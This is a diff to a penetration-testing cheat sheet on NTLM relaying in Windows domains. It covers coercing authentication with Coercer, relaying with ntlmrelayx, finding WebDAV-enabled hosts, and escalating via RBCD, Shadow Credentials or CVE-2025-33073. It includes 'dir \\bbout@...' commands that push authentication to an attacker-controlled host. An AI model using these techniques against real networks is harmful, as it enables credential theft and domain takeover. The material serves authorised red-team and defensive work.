@@ -6,15 +6,28 @@ title: 'NTLM Relaying Tips and Tricks'
 
 **Note:** The cheat sheet assumes modern Windows with NTLMv2 being used. NTLMv1 acts the same as HTTP and can be relayed to anything indicated by the “1”. When relaying NTLMv1 using `ntlmrelayx` you must use the `--remove-mic` flag in most cases (such as SMB->LDAP).
 
-## Coerced Authentication
+## Coerced Authentication via RPC Methods (PetitPotam, ShadowCoerce, DFSCoerce, SpoolSample, etc.)
 
-### via RPC Methods (PetitPotam, ShadowCoerce, DFSCoerce, SpoolSample, etc.)
-[Coercer](https://github.com/p0dalirius/Coercer) is your best bet. It covers many of the PoCs discovered into a single well tested tool. It also works well using a SOCKS5 proxy. Remember to use the `--auth-type {smb,http}` flag because in many cases you want HTTP.
+[Coercer](https://github.com/p0dalirius/Coercer) is your best bet. It covers many of the PoCs discovered into a single well tested tool. It also works well using a SOCKS5 proxy. Remember to use the `--auth-type {smb,http}` flag because in many cases you want HTTP. It can almost always coerce SMB auth, and sometimes HTTP (via WebDAV) if the WebClient service is running.
+
+[ntlmrelayx](https://github.com/fortra/impacket) is the de facto relaying tool. It can capture auth on a wide range of protocols, relay to a wide range of services, and automatically perform many attacks. 
+
+### Checking for WebDAV
 
 The Windows WebClient service can be used to determine if coerced auth via WebDAV (HTTP) will work. Any Domain User can determine if that service is running to find good potential relay victims.
 - Linux: <https://github.com/Hackndo/WebclientServiceScanner>
 - Linux: <https://github.com/Pennyw0rth/NetExec>
 - Windows: <https://github.com/MorDavid/SharpWebClientScanner>
+
+
+
+You can send out auth using WebDAV with different ports, and HTTP/HTTPS like so:
+```
+dir \\bbout\folder
+dir \\bbout@8443\folder
+dir \\bbout@SSL\folder
+dir \\bbout@SSL@8443\folder
+```
 
 Its probably also worth marking all these targets in BloodHound to see which gives paths to DA like so:
 #### Neo4j Console Bulk Mark as Owned
@@ -37,6 +50,9 @@ RETURN p
 ```
 
 Then simply coerce the best targets and compromise them via RBCD or Shadow Creds.
+
+#### CVE-2025-33073
+If computers are missing [CVE-2025-33073](https://www.synacktiv.com/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025), and doesn't require SMB signing, you can relay SMB->SMB using CVE-2025-33073. This effectivaly gets admin on the computer. 
 
 
 
